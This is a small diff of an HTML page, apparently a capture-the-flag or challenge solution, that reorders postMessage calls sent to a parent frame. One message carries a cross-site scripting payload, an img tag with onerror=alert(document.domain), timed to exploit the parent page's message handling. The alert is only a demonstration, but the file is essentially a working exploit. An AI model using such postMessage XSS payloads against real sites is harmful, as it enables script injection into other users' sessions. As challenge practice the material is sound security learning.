@@ -1,12 +1,12 @@
 <html>
 <body>
   <script>
-    
-    parent.postMessage({action: "gotoNextGame", nextGameId: "/challenge/game_debug.html?timeOut=3200"},"*");
-    
     setTimeout(() => {
     parent.postMessage({action: "gotoNextGame", message: "<img src=1 onerror=alert(document.domain) />", nextGameId: "%"},"*");
-        }, 3000);
+    }, 3000);
+    parent.postMessage({action: "gotoNextGame", nextGameId: "/challenge/game_debug.html?timeOut=3200"},"*");
+    
+
 
   </script>
 </body>
